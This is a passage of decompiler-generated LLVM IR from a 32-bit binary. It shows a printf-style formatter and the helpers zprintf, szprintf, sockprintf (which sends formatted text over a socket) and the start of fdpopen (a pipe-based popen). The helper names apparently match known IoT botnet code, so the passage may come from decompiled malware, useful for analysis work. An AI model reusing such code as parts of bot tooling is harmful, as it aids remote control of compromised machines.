  store i32 %v6_804863c, i32* %eax.global-to-local, align 4
  %tmp69 = icmp ult i8 %v2_804863c, 58
  br i1 %tmp69, label %dec_label_pc_804860c, label %dec_label_pc_8048642

dec_label_pc_8048642:                             ; preds = %dec_label_pc_804860c, %dec_label_pc_8048639, %dec_label_pc_8048630.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_8048630.preheader ], [ %stack_var_-36.032, %dec_label_pc_8048639 ], [ %v1_8048627, %dec_label_pc_804860c ]
  %stack_var_8.1.lcssa = phi i8* [ %stack_var_8.0.lcssa, %dec_label_pc_8048630.preheader ], [ %stack_var_8.133, %dec_label_pc_8048639 ], [ %v22_804862d, %dec_label_pc_804860c ]
  %v4_8048630.lcssa = phi i32 [ %v4_804863025, %dec_label_pc_8048630.preheader ], [ %v4_804863034, %dec_label_pc_8048639 ], [ %v5_804862d, %dec_label_pc_804860c ]
  %v5_8048633.lcssa = phi i32 [ %v5_804863328, %dec_label_pc_8048630.preheader ], [ %v5_804863335, %dec_label_pc_8048639 ], [ %v5_8048633, %dec_label_pc_804860c ]
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048645 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048645 = zext i8 %v2_8048645 to i32
  %v6_8048645 = or i32 %v3_8048645, %v5_8048633.lcssa
  store i32 %v6_8048645, i32* %eax.global-to-local, align 4
  %v10_8048647 = icmp eq i8 %v2_8048645, 115
  %v1_8048649 = icmp eq i1 %v10_8048647, false
  br i1 %v1_8048649, label %dec_label_pc_804868d, label %dec_label_pc_804864b

dec_label_pc_804864b:                             ; preds = %dec_label_pc_8048642
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_804864e = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_8048656 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_8048656 = load i32, i32* %v1_8048656, align 4
  store i32 %v2_8048656, i32* %eax.global-to-local, align 4
  %v4_804865b = icmp eq i32 %v2_8048656, 0
  br i1 %v4_804865b, label %dec_label_pc_8048670, label %dec_label_pc_8048661

dec_label_pc_8048661:                             ; preds = %dec_label_pc_804864b
  store i32 %v2_8048656, i32* %eax.global-to-local, align 4
  %v5_8048664 = inttoptr i32 %v2_8048656 to i8*
  br label %dec_label_pc_8048670

dec_label_pc_8048670:                             ; preds = %dec_label_pc_804864b, %dec_label_pc_8048661
  %storemerge = phi i8* [ %v5_8048664, %dec_label_pc_8048661 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8056d20.12, i32 0, i32 0), %dec_label_pc_804864b ]
  %v4_8048670 = ptrtoint i8* %storemerge to i32
  store i32 %v4_8048670, i32* %eax.global-to-local, align 4
  %v5_8048673 = add i32 %v0_80487af, -4
  %v6_8048673 = inttoptr i32 %v5_8048673 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_8048673, align 4
  %v5_8048676 = add i32 %v0_80487af, -8
  %v6_8048676 = inttoptr i32 %v5_8048676 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_8048676, align 4
  %v0_8048679 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048679 = add i32 %v0_80487af, -12
  %v3_8048679 = inttoptr i32 %v2_8048679 to i32*
  store i32 %v0_8048679, i32* %v3_8048679, align 4
  %v5_804867a = add i32 %v0_80487af, -16
  %v6_804867a = inttoptr i32 %v5_804867a to i32*
  store i32 %tmp3, i32* %v6_804867a, align 4
  %v5_804867d = inttoptr i32 %stack_var_-36.0.lcssa to i8*
  %v6_804867d = call i32 @prints(i32 %v4_8048670, i8* %v5_804867d, i32 %stack_var_-32.0.lcssa, i32 %stack_var_-28.154)
  store i32 %v6_804867d, i32* %eax.global-to-local, align 4
  %v0_8048682 = load i32, i32* @esp, align 4
  %v1_8048682 = add i32 %v0_8048682, 16
  %v5_8048685 = add i32 %v6_804867d, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_804868d:                             ; preds = %dec_label_pc_8048642
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048690 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048690 = zext i8 %v2_8048690 to i32
  %v6_8048690 = or i32 %v3_8048690, %v5_8048633.lcssa
  store i32 %v6_8048690, i32* %eax.global-to-local, align 4
  %v10_8048692 = icmp eq i8 %v2_8048690, 100
  %v1_8048694 = icmp eq i1 %v10_8048692, false
  br i1 %v1_8048694, label %dec_label_pc_80486c6, label %dec_label_pc_8048696

dec_label_pc_8048696:                             ; preds = %dec_label_pc_804868d
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_8048699 = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_80486a1 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_80486a1 = load i32, i32* %v1_80486a1, align 4
  store i32 %v2_80486a1, i32* %eax.global-to-local, align 4
  %v1_80486a6 = add i32 %v0_80487af, -8
  %v2_80486a6 = inttoptr i32 %v1_80486a6 to i32*
  store i32 97, i32* %v2_80486a6, align 4
  %v5_80486a8 = add i32 %v0_80487af, -12
  %v6_80486a8 = inttoptr i32 %v5_80486a8 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_80486a8, align 4
  %v5_80486ab = add i32 %v0_80487af, -16
  %v6_80486ab = inttoptr i32 %v5_80486ab to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_80486ab, align 4
  %v1_80486ae = add i32 %v0_80487af, -20
  %v2_80486ae = inttoptr i32 %v1_80486ae to i32*
  store i32 1, i32* %v2_80486ae, align 4
  %v1_80486b0 = add i32 %v0_80487af, -24
  %v2_80486b0 = inttoptr i32 %v1_80486b0 to i32*
  store i32 10, i32* %v2_80486b0, align 4
  %v0_80486b2 = load i32, i32* %eax.global-to-local, align 4
  %v2_80486b2 = add i32 %v0_80487af, -28
  %v3_80486b2 = inttoptr i32 %v2_80486b2 to i32*
  store i32 %v0_80486b2, i32* %v3_80486b2, align 4
  %v5_80486b3 = add i32 %v0_80487af, -32
  %v6_80486b3 = inttoptr i32 %v5_80486b3 to i32*
  store i32 %tmp3, i32* %v6_80486b3, align 4
  %v1_80486b6 = call i32 @printi(i32 %v1_8048699)
  store i32 %v1_80486b6, i32* %eax.global-to-local, align 4
  %v0_80486bb = load i32, i32* @esp, align 4
  %v1_80486bb = add i32 %v0_80486bb, 32
  %v5_80486be = add i32 %v1_80486b6, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_80486c6:                             ; preds = %dec_label_pc_804868d
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_80486c9 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_80486c9 = zext i8 %v2_80486c9 to i32
  %v6_80486c9 = or i32 %v3_80486c9, %v5_8048633.lcssa
  store i32 %v6_80486c9, i32* %eax.global-to-local, align 4
  %v10_80486cb = icmp eq i8 %v2_80486c9, 120
  %v1_80486cd = icmp eq i1 %v10_80486cb, false
  br i1 %v1_80486cd, label %dec_label_pc_80486ff, label %dec_label_pc_80486cf

dec_label_pc_80486cf:                             ; preds = %dec_label_pc_80486c6
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_80486d2 = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_80486da = inttoptr i32 %stack_var_12.152 to i32*
  %v2_80486da = load i32, i32* %v1_80486da, align 4
  store i32 %v2_80486da, i32* %eax.global-to-local, align 4
  %v1_80486df = add i32 %v0_80487af, -8
  %v2_80486df = inttoptr i32 %v1_80486df to i32*
  store i32 97, i32* %v2_80486df, align 4
  %v5_80486e1 = add i32 %v0_80487af, -12
  %v6_80486e1 = inttoptr i32 %v5_80486e1 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_80486e1, align 4
  %v5_80486e4 = add i32 %v0_80487af, -16
  %v6_80486e4 = inttoptr i32 %v5_80486e4 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_80486e4, align 4
  %v1_80486e7 = add i32 %v0_80487af, -20
  %v2_80486e7 = inttoptr i32 %v1_80486e7 to i32*
  store i32 0, i32* %v2_80486e7, align 4
  %v1_80486e9 = add i32 %v0_80487af, -24
  %v2_80486e9 = inttoptr i32 %v1_80486e9 to i32*
  store i32 16, i32* %v2_80486e9, align 4
  %v0_80486eb = load i32, i32* %eax.global-to-local, align 4
  %v2_80486eb = add i32 %v0_80487af, -28
  %v3_80486eb = inttoptr i32 %v2_80486eb to i32*
  store i32 %v0_80486eb, i32* %v3_80486eb, align 4
  %v5_80486ec = add i32 %v0_80487af, -32
  %v6_80486ec = inttoptr i32 %v5_80486ec to i32*
  store i32 %tmp3, i32* %v6_80486ec, align 4
  %v1_80486ef = call i32 @printi(i32 %v1_80486d2)
  store i32 %v1_80486ef, i32* %eax.global-to-local, align 4
  %v0_80486f4 = load i32, i32* @esp, align 4
  %v1_80486f4 = add i32 %v0_80486f4, 32
  %v5_80486f7 = add i32 %v1_80486ef, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_80486ff:                             ; preds = %dec_label_pc_80486c6
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048702 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048702 = zext i8 %v2_8048702 to i32
  %v6_8048702 = or i32 %v3_8048702, %v5_8048633.lcssa
  store i32 %v6_8048702, i32* %eax.global-to-local, align 4
  %v10_8048704 = icmp eq i8 %v2_8048702, 88
  %v1_8048706 = icmp eq i1 %v10_8048704, false
  br i1 %v1_8048706, label %dec_label_pc_8048738, label %dec_label_pc_8048708

dec_label_pc_8048708:                             ; preds = %dec_label_pc_80486ff
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_804870b = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_8048713 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_8048713 = load i32, i32* %v1_8048713, align 4
  store i32 %v2_8048713, i32* %eax.global-to-local, align 4
  %v1_8048718 = add i32 %v0_80487af, -8
  %v2_8048718 = inttoptr i32 %v1_8048718 to i32*
  store i32 65, i32* %v2_8048718, align 4
  %v5_804871a = add i32 %v0_80487af, -12
  %v6_804871a = inttoptr i32 %v5_804871a to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_804871a, align 4
  %v5_804871d = add i32 %v0_80487af, -16
  %v6_804871d = inttoptr i32 %v5_804871d to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_804871d, align 4
  %v1_8048720 = add i32 %v0_80487af, -20
  %v2_8048720 = inttoptr i32 %v1_8048720 to i32*
  store i32 0, i32* %v2_8048720, align 4
  %v1_8048722 = add i32 %v0_80487af, -24
  %v2_8048722 = inttoptr i32 %v1_8048722 to i32*
  store i32 16, i32* %v2_8048722, align 4
  %v0_8048724 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048724 = add i32 %v0_80487af, -28
  %v3_8048724 = inttoptr i32 %v2_8048724 to i32*
  store i32 %v0_8048724, i32* %v3_8048724, align 4
  %v5_8048725 = add i32 %v0_80487af, -32
  %v6_8048725 = inttoptr i32 %v5_8048725 to i32*
  store i32 %tmp3, i32* %v6_8048725, align 4
  %v1_8048728 = call i32 @printi(i32 %v1_804870b)
  store i32 %v1_8048728, i32* %eax.global-to-local, align 4
  %v0_804872d = load i32, i32* @esp, align 4
  %v1_804872d = add i32 %v0_804872d, 32
  %v5_8048730 = add i32 %v1_8048728, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_8048738:                             ; preds = %dec_label_pc_80486ff
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_804873b = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_804873b = zext i8 %v2_804873b to i32
  %v6_804873b = or i32 %v3_804873b, %v5_8048633.lcssa
  store i32 %v6_804873b, i32* %eax.global-to-local, align 4
  %v10_804873d = icmp eq i8 %v2_804873b, 117
  %v1_804873f = icmp eq i1 %v10_804873d, false
  br i1 %v1_804873f, label %dec_label_pc_804876e, label %dec_label_pc_8048741

dec_label_pc_8048741:                             ; preds = %dec_label_pc_8048738
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_8048744 = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_804874c = inttoptr i32 %stack_var_12.152 to i32*
  %v2_804874c = load i32, i32* %v1_804874c, align 4
  store i32 %v2_804874c, i32* %eax.global-to-local, align 4
  %v1_8048751 = add i32 %v0_80487af, -8
  %v2_8048751 = inttoptr i32 %v1_8048751 to i32*
  store i32 97, i32* %v2_8048751, align 4
  %v5_8048753 = add i32 %v0_80487af, -12
  %v6_8048753 = inttoptr i32 %v5_8048753 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_8048753, align 4
  %v5_8048756 = add i32 %v0_80487af, -16
  %v6_8048756 = inttoptr i32 %v5_8048756 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_8048756, align 4
  %v1_8048759 = add i32 %v0_80487af, -20
  %v2_8048759 = inttoptr i32 %v1_8048759 to i32*
  store i32 0, i32* %v2_8048759, align 4
  %v1_804875b = add i32 %v0_80487af, -24
  %v2_804875b = inttoptr i32 %v1_804875b to i32*
  store i32 10, i32* %v2_804875b, align 4
  %v0_804875d = load i32, i32* %eax.global-to-local, align 4
  %v2_804875d = add i32 %v0_80487af, -28
  %v3_804875d = inttoptr i32 %v2_804875d to i32*
  store i32 %v0_804875d, i32* %v3_804875d, align 4
  %v5_804875e = add i32 %v0_80487af, -32
  %v6_804875e = inttoptr i32 %v5_804875e to i32*
  store i32 %tmp3, i32* %v6_804875e, align 4
  %v1_8048761 = call i32 @printi(i32 %v1_8048744)
  store i32 %v1_8048761, i32* %eax.global-to-local, align 4
  %v0_8048766 = load i32, i32* @esp, align 4
  %v1_8048766 = add i32 %v0_8048766, 32
  %v5_8048769 = add i32 %v1_8048761, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_804876e:                             ; preds = %dec_label_pc_8048738
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048771 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048771 = zext i8 %v2_8048771 to i32
  %v6_8048771 = or i32 %v3_8048771, %v5_8048633.lcssa
  store i32 %v6_8048771, i32* %eax.global-to-local, align 4
  %v10_8048773 = icmp eq i8 %v2_8048771, 99
  %v1_8048775 = icmp eq i1 %v10_8048773, false
  br i1 %v1_8048775, label %dec_label_pc_80487c1, label %dec_label_pc_8048777

dec_label_pc_8048777:                             ; preds = %dec_label_pc_804876e
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_804877a = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_8048782 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_8048782 = load i32, i32* %v1_8048782, align 4
  store i32 %v2_8048782, i32* %stack_var_-6, align 4
  %v5_804878b = add i32 %v0_80487af, -4
  %v6_804878b = inttoptr i32 %v5_804878b to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_804878b, align 4
  %v5_804878e = add i32 %v0_80487af, -8
  %v6_804878e = inttoptr i32 %v5_804878e to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_804878e, align 4
  store i32 %v2_8048791, i32* %eax.global-to-local, align 4
  %v2_8048794 = add i32 %v0_80487af, -12
  %v3_8048794 = inttoptr i32 %v2_8048794 to i32*
  store i32 %v2_8048791, i32* %v3_8048794, align 4
  %v5_8048795 = add i32 %v0_80487af, -16
  %v6_8048795 = inttoptr i32 %v5_8048795 to i32*
  store i32 %tmp3, i32* %v6_8048795, align 4
  %v0_8048798 = load i32, i32* %stack_var_-6, align 4
  %v6_8048798 = call i32 @prints(i32 %v0_8048798, i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_8048798, i32* %eax.global-to-local, align 4
  %v0_804879d = load i32, i32* @esp, align 4
  %v1_804879d = add i32 %v0_804879d, 16
  %v5_80487a0 = add i32 %v6_8048798, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_80487a5:                             ; preds = %dec_label_pc_80485d8, %dec_label_pc_80485ae
  %stack_var_8.2 = phi i8* [ %stack_var_8.455, %dec_label_pc_80485ae ], [ %v22_80485bb, %dec_label_pc_80485d8 ]
  %v4_80487a5 = ptrtoint i8* %stack_var_8.2 to i32
  store i32 %v4_80487a5, i32* %eax.global-to-local, align 4
  %v2_80487a8 = load i8, i8* %stack_var_8.2, align 1
  %v3_80487a8 = zext i8 %v2_80487a8 to i32
  store i32 %v3_80487a8, i32* %eax.global-to-local, align 4
  %v2_80487b2 = add i32 %v0_80487af, -12
  %v3_80487b2 = inttoptr i32 %v2_80487b2 to i32*
  store i32 %v3_80487a8, i32* %v3_80487b2, align 4
  %v5_80487b3 = add i32 %v0_80487af, -16
  %v6_80487b3 = inttoptr i32 %v5_80487b3 to i32*
  store i32 %tmp3, i32* %v6_80487b3, align 4
  %v2_80487b6 = inttoptr i32 %stack_var_-28.154 to i32*
  %v3_80487b6 = call i32 @printchar(i32* %v2_80487b6, i32 %stack_var_-24.151)
  store i32 %v3_80487b6, i32* %eax.global-to-local, align 4
  %v0_80487bb = load i32, i32* @esp, align 4
  %v1_80487bb = add i32 %v0_80487bb, 16
  %v4_80487be = add i32 %stack_var_-28.154, 1
  br label %dec_label_pc_80487c1

dec_label_pc_80487c1:                             ; preds = %dec_label_pc_804876e, %dec_label_pc_8048777, %dec_label_pc_8048741, %dec_label_pc_8048708, %dec_label_pc_8048670, %dec_label_pc_80486cf, %dec_label_pc_8048696, %dec_label_pc_80487a5
  %v4_804867366 = phi i32 [ %v1_80487bb, %dec_label_pc_80487a5 ], [ %v0_80487af, %dec_label_pc_804876e ], [ %v1_804879d, %dec_label_pc_8048777 ], [ %v1_8048766, %dec_label_pc_8048741 ], [ %v1_804872d, %dec_label_pc_8048708 ], [ %v1_80486f4, %dec_label_pc_80486cf ], [ %v1_80486bb, %dec_label_pc_8048696 ], [ %v1_8048682, %dec_label_pc_8048670 ]
  %stack_var_-24.0 = phi i32 [ %stack_var_-24.151, %dec_label_pc_80487a5 ], [ %stack_var_-24.151, %dec_label_pc_804876e ], [ %stack_var_-24.151, %dec_label_pc_8048777 ], [ %stack_var_-24.151, %dec_label_pc_8048741 ], [ %stack_var_-24.151, %dec_label_pc_8048708 ], [ %stack_var_-24.151, %dec_label_pc_80486cf ], [ %stack_var_-24.151, %dec_label_pc_8048696 ], [ %v2_8048656, %dec_label_pc_8048670 ]
  %stack_var_12.0 = phi i32 [ %stack_var_12.152, %dec_label_pc_80487a5 ], [ %stack_var_12.152, %dec_label_pc_804876e ], [ %v1_804877a, %dec_label_pc_8048777 ], [ %v1_8048744, %dec_label_pc_8048741 ], [ %v1_804870b, %dec_label_pc_8048708 ], [ %v1_80486d2, %dec_label_pc_80486cf ], [ %v1_8048699, %dec_label_pc_8048696 ], [ %v1_804864e, %dec_label_pc_8048670 ]
  %stack_var_8.3 = phi i8* [ %stack_var_8.2, %dec_label_pc_80487a5 ], [ %stack_var_8.1.lcssa, %dec_label_pc_804876e ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048777 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048741 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048708 ], [ %stack_var_8.1.lcssa, %dec_label_pc_80486cf ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048696 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048670 ]
  %stack_var_-28.0 = phi i32 [ %v4_80487be, %dec_label_pc_80487a5 ], [ %stack_var_-28.154, %dec_label_pc_804876e ], [ %v5_80487a0, %dec_label_pc_8048777 ], [ %v5_8048769, %dec_label_pc_8048741 ], [ %v5_8048730, %dec_label_pc_8048708 ], [ %v5_80486f7, %dec_label_pc_80486cf ], [ %v5_80486be, %dec_label_pc_8048696 ], [ %v5_8048685, %dec_label_pc_8048670 ]
  %v4_80487c1 = ptrtoint i8* %stack_var_8.3 to i32
  %v5_80487c1 = add i32 %v4_80487c1, 1
  %stack_var_8.4 = inttoptr i32 %v5_80487c1 to i8*
  store i32 %v5_80487c1, i32* %eax.global-to-local, align 4
  %v2_80487c7 = load i8, i8* %stack_var_8.4, align 1
  %v3_80487c7 = zext i8 %v2_80487c7 to i32
  %v5_80487c7 = and i32 %v5_80487c1, -256
  %v6_80487c7 = or i32 %v3_80487c7, %v5_80487c7
  store i32 %v6_80487c7, i32* %eax.global-to-local, align 4
  %v4_80487c9 = icmp eq i8 %v2_80487c7, 0
  %v1_80487cb = icmp eq i1 %v4_80487c9, false
  br i1 %v1_80487cb, label %dec_label_pc_80485ae, label %dec_label_pc_80487d1

dec_label_pc_80487d1:                             ; preds = %dec_label_pc_80487c1, %dec_label_pc_80485bb, %entry
  %stack_var_-28.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-28.154, %dec_label_pc_80485bb ], [ %stack_var_-28.0, %dec_label_pc_80487c1 ]
  %v4_80487d1 = icmp eq i32* %arg1, null
  br i1 %v4_80487d1, label %dec_label_pc_80487df, label %dec_label_pc_80487d7

dec_label_pc_80487d7:                             ; preds = %dec_label_pc_80487d1
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v2_80487da = load i32, i32* %arg1, align 4
  store i32 %v2_80487da, i32* %eax.global-to-local, align 4
  %v1_80487dc = inttoptr i32 %v2_80487da to i8*
  store i8 0, i8* %v1_80487dc, align 1
  br label %dec_label_pc_80487df

dec_label_pc_80487df:                             ; preds = %dec_label_pc_80487d1, %dec_label_pc_80487d7
  store i32 %stack_var_-28.1.lcssa, i32* %eax.global-to-local, align 4
  %v2_80487e2 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80487e2, i32* @ebp, align 4
  ret i32 %stack_var_-28.1.lcssa

; uselistorder directives
  uselistorder i32 %v5_80487c7, { 1, 0 }
  uselistorder i8* %stack_var_8.4, { 1, 0 }
  uselistorder i32 %v5_80487c1, { 3, 2, 1, 0 }
  uselistorder i8* %stack_var_8.2, { 0, 2, 1 }
  uselistorder i32 %v2_8048656, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_8048633.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_8048630.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %stack_var_8.1.lcssa, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-36.0.lcssa, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %stack_var_-32.0.lcssa, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_80485fa, { 1, 2, 3, 0 }
  uselistorder i8* %v22_80485bb, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-24.151, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_12.152, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 %stack_var_8.4.in53, { 2, 1, 0 }
  uselistorder i32 %stack_var_-28.154, { 0, 3, 2, 1, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 %v0_80487af, { 38, 1, 0, 5, 4, 3, 2, 12, 11, 10, 9, 8, 7, 6, 19, 18, 17, 16, 15, 14, 13, 26, 25, 24, 23, 22, 21, 20, 33, 32, 31, 30, 29, 28, 27, 37, 36, 35, 34 }
  uselistorder i32 %tmp3, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 49, 50, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 57, 58, 59, 60, 61, 62, 63, 64, 65, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 36, 37, 38, 34, 54, 53, 39, 40, 52, 51, 41, 42, 43, 44, 45, 46, 47, 48, 55, 56 }
  uselistorder i32 (i32)* @printi, { 3, 2, 0, 1 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_80487df, { 1, 0 }
  uselistorder label %dec_label_pc_80487c1, { 7, 1, 0, 2, 3, 5, 6, 4 }
  uselistorder label %dec_label_pc_8048670, { 1, 0 }
  uselistorder label %dec_label_pc_8048642, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048639, { 1, 0 }
  uselistorder label %dec_label_pc_80485fa, { 1, 0 }
  uselistorder label %dec_label_pc_80485ae, { 1, 0 }
}

define i32 @zprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i32, align 4
  %v4_80487ed = ptrtoint i32* %stack_var_8 to i32
  %v4_80487fc = call i32 @print(i32* null, i32 %arg1, i32 %v4_80487ed)
  ret i32 %v4_80487fc
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %v4_804880f = ptrtoint i32* %stack_var_12 to i32
  %v4_8048820 = call i32 @print(i32* nonnull %stack_var_4, i32 %arg1, i32 %v4_804880f)
  ret i32 %v4_8048820
}

define i32 @sockprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %v0_804882d = load i32, i32* @edi, align 4
  %v1_8048839 = call i32 @malloc(i32 2048)
  store i32 %v1_8048839, i32* %stack_var_-20, align 4
  %v3_8048855 = inttoptr i32 %v1_8048839 to i8*
  %v4_8048855 = call i32 @__GI_memset(i8* %v3_8048855, i32 0, i32 2048)
  %v4_8048866 = ptrtoint i32* %stack_var_12 to i32
  %v4_8048878 = call i32 @print(i32* nonnull %stack_var_-20, i32 %arg2, i32 %v4_8048866)
  %v3_8048891 = call i32 @_strlen(i8* %v3_8048855)
  %v6_8048898 = add i32 %v1_8048839, %v3_8048891
  %v1_804889b = inttoptr i32 %v6_8048898 to i8*
  store i8 10, i8* %v1_804889b, align 1
  store i1 false, i1* @df, align 1
  store i32 %v1_8048839, i32* @edi, align 4
  %v3_80488af = call i32 @_strlen(i8* %v3_8048855)
  %v4_80488c2 = call i32 @__libc_send(i32 %arg1, i32 %v1_8048839, i32 %v3_80488af, i32 16384)
  %v1_80488d3 = call i32 @free(i32 %v1_8048839)
  store i32 %v0_804882d, i32* @edi, align 4
  ret i32 %v4_80488c2

; uselistorder directives
  uselistorder i32 %v1_8048839, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @fdpopen() local_unnamed_addr {
entry:
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80488e6 = load i32, i32* @edi, align 4
  store i32 %v0_80488e6, i32* %stack_var_-8, align 4
  %v4_80488ea = ptrtoint i8* %tmp24 to i32
  %v2_80488ed = load i8, i8* %tmp24, align 1
  %v10_80488ef = icmp eq i8 %v2_80488ed, 114
  br i1 %v10_80488ef, label %dec_label_pc_80488fc, label %dec_label_pc_80488f3

dec_label_pc_80488f3:                             ; preds = %entry
  %v2_80488f6 = load i8, i8* %tmp24, align 1
  %v10_80488f8 = icmp eq i8 %v2_80488f6, 119
  %v1_80488fa = icmp eq i1 %v10_80488f8, false
  br i1 %v1_80488fa, label %dec_label_pc_8048ad1, label %dec_label_pc_80488fc

dec_label_pc_80488fc:                             ; preds = %dec_label_pc_80488f3, %entry
  %v1_80488ff = add i32 %v4_80488ea, 1
  %v1_8048900 = inttoptr i32 %v1_80488ff to i8*
  %v2_8048900 = load i8, i8* %v1_8048900, align 1
  %v4_8048902 = icmp eq i8 %v2_8048900, 0
  br i1 %v4_8048902, label %dec_label_pc_8048912, label %dec_label_pc_8048ad1

dec_label_pc_8048912:                             ; preds = %dec_label_pc_80488fc
  %v2_8048915 = ptrtoint i32* %stack_var_-24 to i32
  %v1_8048919 = call i32 @__GI_pipe(i32 %v2_8048915)
  %v2_8048921 = icmp slt i32 %v1_8048919, 0
  %v1_8048923 = icmp eq i1 %v2_8048921, false
  br i1 %v1_8048923, label %dec_label_pc_8048931, label %dec_label_pc_8048ad1

dec_label_pc_8048931:                             ; preds = %dec_label_pc_8048912
  %v0_8048931 = load i8*, i8** @global_var_80655a0.13, align 4
  %v2_8048936 = icmp eq i8* %v0_8048931, null
  %v1_8048938 = icmp eq i1 %v2_8048936, false
  br i1 %v1_8048938, label %bb, label %dec_label_pc_804893a

dec_label_pc_804893a:                             ; preds = %dec_label_pc_8048931
  %v0_804893a = call i32 @getdtablesize()
  %tmp37 = icmp slt i32 %v0_804893a, 1
  %tmp38 = icmp eq i1 %tmp37, false
  br i1 %tmp38, label %dec_label_pc_8048954, label %dec_label_pc_8048ad1

dec_label_pc_8048954:                             ; preds = %dec_label_pc_804893a
  %v2_8048957 = mul i32 %v0_804893a, 4
  %v1_804895e = call i32 @malloc(i32 %v2_8048957)
